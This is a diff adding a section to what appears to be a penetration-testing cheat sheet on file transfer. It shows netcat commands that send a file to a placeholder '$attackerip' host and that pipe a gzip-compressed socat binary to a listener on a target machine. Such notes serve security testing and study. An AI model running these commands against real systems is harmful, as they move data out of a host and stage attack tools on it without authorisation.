@@ -35,6 +35,16 @@ nc -lvp 443> transfer.txt
 cat transfer.txt | nc $attackerip 443
 ```
 
+### NC Transfer with gzip data
+
+```
+//on target machine 
+nc -nvlp 10000 | gzip -d > .y
+//local machine 
+cat ~/tools/static-binaries/socat/socat | gzip -c - | nc 127.0.0.1 10000
+// check md5 hashes match on both systems
+```
+
 ## Web Servers:
 
 ### Python HTTP Server File Transfer
